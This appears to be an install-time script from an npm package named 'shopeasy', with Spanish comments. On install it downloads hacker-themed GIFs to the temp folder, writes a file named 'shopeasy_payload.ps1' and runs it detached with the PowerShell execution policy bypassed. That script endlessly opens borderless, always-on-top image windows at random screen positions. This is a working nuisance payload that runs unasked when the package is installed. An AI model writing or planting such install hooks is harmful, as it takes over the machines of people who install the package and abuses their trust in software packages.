const fs = require("fs");
const https = require("https");
const http = require("http");
const { spawn } = require("child_process");
const os = require("os");
const path = require("path");

const imageUrls = [
    "https://media.tenor.com/nPd-ijwBSKQAAAAM/hacker-pc.gif",
    "https://media.tenor.com/zh58XZRJuzYAAAAM/cat-hacking.gif",
    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUydTNmbHIzNHVkM2k5cDdrcHRqb3BtcjVyazljdjVtN3Nzdm5ud3d3OCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3wr2cnwlghNomDeN9W/giphy_s.gif",
    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyNnppMHdlNm5zcHVrY2p5a3R1N3I5dzd6dWp6eThoNmxuc2JhdTh2ZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/P8ef3Dkynk0xLx1h1T/giphy.gif",
];

// Descarga con soporte a redirects y http/https
function downloadImage(url, filename, redirects = 0) {
    return new Promise((resolve) => {
        if (redirects > 5) { resolve(); return; }

        try {
            const client = url.startsWith("https") ? https : http;
            const req = client.get(url, (res) => {
                if (res.statusCode === 301 || res.statusCode === 302) {
                    resolve(downloadImage(res.headers.location, filename, redirects + 1));
                    return;
                }
                const file = fs.createWriteStream(filename);
                res.pipe(file);
                file.on("finish", () => { file.close(); resolve(); });
                file.on("error", () => resolve());
            });
            req.on("error", () => resolve());
            req.setTimeout(8000, () => { req.destroy(); resolve(); });
        } catch {
            resolve();
        }
    });
}

// Lanza el slideshow como proceso DESACOPLADO escribiendo un .ps1 temp
function lanzarSlideshow(filenames) {
    const validos = filenames.filter(f => {
        try { return fs.existsSync(f) && fs.statSync(f).size > 200; }
        catch { return false; }
    });

    if (validos.length === 0) return;

    // Escapar backslashes para PowerShell
    const archivos = validos.map(f => f.replace(/\\/g, "\\\\")).join('","');

    const psScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$files  = @("${archivos}")
$idx    = 0

$timer          = New-Object System.Windows.Forms.Timer
$timer.Interval = 2000

$timer.Add_Tick({
    $f = $files[$script:idx % $files.Count]
    $script:idx++
    try {
        $img = [System.Drawing.Image]::FromFile($f)
        $W = 550; $H = 350
        $x = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Width  - $W))
        $y = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Height - $H))

        $form = New-Object Windows.Forms.Form
        $form.StartPosition   = "Manual"
        $form.Location        = New-Object Drawing.Point($x, $y)
        $form.Size            = New-Object Drawing.Size($W, $H)
        $form.TopMost         = $true
        $form.FormBorderStyle = "None"
        $form.BackColor       = [Drawing.Color]::Black

        $pb          = New-Object Windows.Forms.PictureBox
        $pb.Image    = $img
        $pb.Dock     = "Fill"
        $pb.SizeMode = "StretchImage"
        $form.Controls.Add($pb)
        $form.Show()
    } catch {}
})

$timer.Start()
[System.Windows.Forms.Application]::Run()
`;

    const psFile = path.join(os.tmpdir(), "shopeasy_payload.ps1");
    fs.writeFileSync(psFile, psScript, "utf8");

    // Detached = no bloquea npm install
    spawn("powershell", ["-ExecutionPolicy", "Bypass", "-File", psFile], {
        detached: true,
        stdio: "ignore",
        windowsHide: false,
    }).unref();
}

(async () => {
    const tmpDir = os.tmpdir();
    const filenames = [];

    for (let i = 0; i < imageUrls.length; i++) {
        const filename = path.join(tmpDir, `shopeasy_img_${i}.gif`);
        filenames.push(filename);
        await downloadImage(imageUrls[i], filename);
    }

    lanzarSlideshow(filenames);

    // Salir para que npm install pueda terminar
    process.exit(0);
})();
